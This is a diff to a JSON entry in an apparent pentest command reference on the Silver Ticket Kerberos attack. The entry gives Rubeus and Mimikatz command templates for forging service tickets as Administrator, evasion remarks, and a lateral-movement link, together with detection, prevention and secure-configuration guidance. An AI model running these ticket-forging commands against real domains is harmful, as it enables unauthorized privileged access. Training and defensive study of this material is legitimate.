@@ -2,7 +2,7 @@
   "id": "crtp-silver-ticket",
   "name": "Silver Ticket Attack (Rubeus)",
   "command": "Rubeus.exe silver /service:<spn> /rc4:<nt_hash> /sid:<domain_sid> /user:Administrator /domain:<domain> /ptt",
-  "description": "Forge a TGS (Silver Ticket) for a specific service using the service account's NTLM hash. Bypasses KDC entirely \u2014 more stealthy than golden tickets.",
+  "description": "Forge a TGS (Silver Ticket) for a specific service using the service account's NTLM hash. Bypasses KDC entirely — more stealthy than golden tickets.",
   "platform": "windows",
   "category": "Active Directory",
   "subcategory": "Persistence",
@@ -75,9 +75,14 @@
       "id": "crtp-diamond-ticket",
       "note": "Diamond ticket as stealthier alternative",
       "rel": "alternative"
+    },
+    {
+      "id": "crtp-psremoting",
+      "rel": "next",
+      "note": "Use the forged service ticket (HTTP/WSMAN) to move laterally to the target host"
     }
   ],
-  "notes": "Silver tickets never contact KDC for TGS \u2014 no event 4769. Stealthy but limited to specific service. Machine$ accounts for host/cifs.",
+  "notes": "Silver tickets never contact KDC for TGS — no event 4769. Stealthy but limited to specific service. Machine$ accounts for host/cifs.",
   "references": [
     {
       "title": "CRTP - Silver Ticket",
@@ -89,18 +94,32 @@
     }
   ],
   "defense": {
-    "why_it_works": "Silver Tickets are forged Kerberos service tickets (TGS) signed with the service account's NTLM hash \u2014 not the krbtgt hash. The target service validates the ticket using its own key, not by contacting the KDC. A forged silver ticket for CIFS/HOST on a server grants file system or command execution access to that specific server as any user (including DA), without any KDC interaction \u2014 making it stealthier than a Golden Ticket.",
+    "why_it_works": "Silver Tickets are forged Kerberos service tickets (TGS) signed with the service account's NTLM hash — not the krbtgt hash. The target service validates the ticket using its own key, not by contacting the KDC. A forged silver ticket for CIFS/HOST on a server grants file system or command execution access to that specific server as any user (including DA), without any KDC interaction — making it stealthier than a Golden Ticket.",
     "prerequisites": "NTLM hash of the target service account or computer account. Domain SID. Target server FQDN and service SPN. Rubeus /silver or Mimikatz. Network access to the target service.",
-    "impact": "T1558.002 Steal or Forge Kerberos Tickets: Silver Ticket. Access to a specific service on a specific server as any user \u2014 DA-equivalent access to that host. Common targets: CIFS (file shares), HOST (full system access), HTTP (web apps), MSSQL. No KDC interaction means traditional Kerberos logging is bypassed.",
-    "detection": "Event 4624 (logon) on target server with Kerberos authentication but no corresponding Event 4768/4769 on the DC (silver ticket skips KDC entirely). MDI: 'Suspected Kerberos forged ticket' \u2014 detects when authentication arrives without a prior KDC exchange. Sysmon Event 3: network connection from unexpected source using Kerberos to reach a service. PAC validation if enabled on the service (PAC validation contacts DC \u2014 would catch forged PACs).\nAnomalous Kerberos activity: forged or stolen tickets by correlating malformed fields in logon events, RC4-encrypted TGTs, or TGS requests without corresponding TGT requests; suspicious processes accessing LSASS memory for ticket extraction (DET0522/AN1443).\nSuspicious access to SSSD secrets database and Kerberos key material indicating ticket theft or replay; correlate anomalous file access with unusual Kerberos service ticket requests (AN1444).\nForging or replaying Kerberos tickets: monitor Unified Logs for anomalous kinit/klist activity and unusual authentication sequences (AN1445).",
+    "impact": "T1558.002 Steal or Forge Kerberos Tickets: Silver Ticket. Access to a specific service on a specific server as any user — DA-equivalent access to that host. Common targets: CIFS (file shares), HOST (full system access), HTTP (web apps), MSSQL. No KDC interaction means traditional Kerberos logging is bypassed.",
+    "detection": "Event 4624 (logon) on target server with Kerberos authentication but no corresponding Event 4768/4769 on the DC (silver ticket skips KDC entirely). MDI: 'Suspected Kerberos forged ticket' — detects when authentication arrives without a prior KDC exchange. Sysmon Event 3: network connection from unexpected source using Kerberos to reach a service. PAC validation if enabled on the service (PAC validation contacts DC — would catch forged PACs).\nAnomalous Kerberos activity: forged or stolen tickets by correlating malformed fields in logon events, RC4-encrypted TGTs, or TGS requests without corresponding TGT requests; suspicious processes accessing LSASS memory for ticket extraction (DET0522/AN1443).\nSuspicious access to SSSD secrets database and Kerberos key material indicating ticket theft or replay; correlate anomalous file access with unusual Kerberos service ticket requests (AN1444).\nForging or replaying Kerberos tickets: monitor Unified Logs for anomalous kinit/klist activity and unusual authentication sequences (AN1445).",
     "artifacts": "Event 4624 on target: type 3 Kerberos with no prior 4768 on DC | MDI: forged Kerberos ticket alert | Absence of 4769 on DC for the connection | Target service access logs showing unexpected user access",
-    "prevention": "Enable PAC validation on services (requires DC contact for every service authentication \u2014 catches forged PACs). Rotate service account passwords regularly. Use gMSA (auto-rotating passwords \u2014 forged silver ticket expires when password rotates). MDI deployment. Monitor for Kerberos authentication without prior KDC exchange.\nActive Directory Configuration: Reset KRBTGT account password twice (invalidates all golden tickets); rotate every 180 days.\nAudit: Scan for insecure Kerberos configurations.\nCredential Access Protection: On Linux, use SELinux to protect Kerberos key material.\nEncrypt Sensitive Information: Enable AES Kerberos encryption instead of RC4.\nPassword Policies: Service accounts should have 25+ character passwords; use Group Managed Service Accounts (gMSA).\nPrivileged Account Management: Limit domain admin to DCs only; restrict service account privileges.",
-    "evasion": "Silver tickets only work for the specific service on the specific host \u2014 more limited than Golden Tickets but much stealthier. No KDC log entries. Use for targeted access rather than broad movement.",
+    "prevention": "Enable PAC validation on services (requires DC contact for every service authentication — catches forged PACs). Rotate service account passwords regularly. Use gMSA (auto-rotating passwords — forged silver ticket expires when password rotates). MDI deployment. Monitor for Kerberos authentication without prior KDC exchange.\nActive Directory Configuration: Reset KRBTGT account password twice (invalidates all golden tickets); rotate every 180 days.\nAudit: Scan for insecure Kerberos configurations.\nCredential Access Protection: On Linux, use SELinux to protect Kerberos key material.\nEncrypt Sensitive Information: Enable AES Kerberos encryption instead of RC4.\nPassword Policies: Service accounts should have 25+ character passwords; use Group Managed Service Accounts (gMSA).\nPrivileged Account Management: Limit domain admin to DCs only; restrict service account privileges.",
+    "evasion": "Silver tickets only work for the specific service on the specific host — more limited than Golden Tickets but much stealthier. No KDC log entries. Use for targeted access rather than broad movement.",
     "sources": [
       "https://attack.mitre.org/techniques/T1558/002/"
     ],
     "misconfiguration": "Service accounts have weak/old NTLM hashes (from Kerberoasting). No PAC validation enabled on services. gMSA not used. No monitoring for KDC-bypass authentication patterns.",
-    "vulnerable_config": "# Service account with stale NTLM hash (Kerberoasted + cracked):\n# MSSQL running as svc_sql with password 'Sql2018!' \u2014 same hash for 5 years\n# Silver ticket for MSSQLSvc/server.corp.local forged \u2192 full DB access as DA\n\n# PAC validation disabled (default \u2014 services don't validate PAC with DC):\n# HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ValidateKdcPacSignature = 0 (or absent)",
-    "secure_config": "# Use gMSA for all service accounts (auto-rotating passwords every 30 days):\nNew-ADServiceAccount -Name 'svc_sql' -DNSHostName 'sql.corp.local' -ManagedPasswordIntervalInDays 30\n\n# Enable PAC validation (forces DC contact for each auth \u2014 catches forged PACs):\n# HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ValidateKdcPacSignature = 1\n# Note: performance impact \u2014 evaluate per-environment\n\n# Monitor for Kerberos auth without prior KDC exchange:\n# MDI: 'Suspected Kerberos forged ticket (silver ticket)' alert \u2014 enabled by default\n\n# Rotate compromised service account passwords immediately:\nSet-ADAccountPassword svc_sql -Reset -NewPassword (ConvertTo-SecureString (New-Guid) -AsPlainText -Force)"
-  }
+    "vulnerable_config": "# Service account with stale NTLM hash (Kerberoasted + cracked):\n# MSSQL running as svc_sql with password 'Sql2018!' — same hash for 5 years\n# Silver ticket for MSSQLSvc/server.corp.local forged → full DB access as DA\n\n# PAC validation disabled (default — services don't validate PAC with DC):\n# HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ValidateKdcPacSignature = 0 (or absent)",
+    "secure_config": "# Use gMSA for all service accounts (auto-rotating passwords every 30 days):\nNew-ADServiceAccount -Name 'svc_sql' -DNSHostName 'sql.corp.local' -ManagedPasswordIntervalInDays 30\n\n# Enable PAC validation (forces DC contact for each auth — catches forged PACs):\n# HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ValidateKdcPacSignature = 1\n# Note: performance impact — evaluate per-environment\n\n# Monitor for Kerberos auth without prior KDC exchange:\n# MDI: 'Suspected Kerberos forged ticket (silver ticket)' alert — enabled by default\n\n# Rotate compromised service account passwords immediately:\nSet-ADAccountPassword svc_sql -Reset -NewPassword (ConvertTo-SecureString (New-Guid) -AsPlainText -Force)"
+  },
+  "variations": [
+    {
+      "label": "CIFS service (file access)",
+      "command": "Rubeus.exe silver /service:cifs/<host_fqdn> /rc4:<machine_hash> /sid:<domain_sid> /user:Administrator /domain:<domain> /ptt"
+    },
+    {
+      "label": "HOST service (schtasks/wmi)",
+      "command": "Rubeus.exe silver /service:host/<host_fqdn> /rc4:<machine_hash> /sid:<domain_sid> /user:Administrator /domain:<domain> /ptt"
+    },
+    {
+      "label": "Mimikatz",
+      "command": "kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /target:<host_fqdn> /service:cifs /rc4:<machine_hash> /ptt"
+    }
+  ]
 }
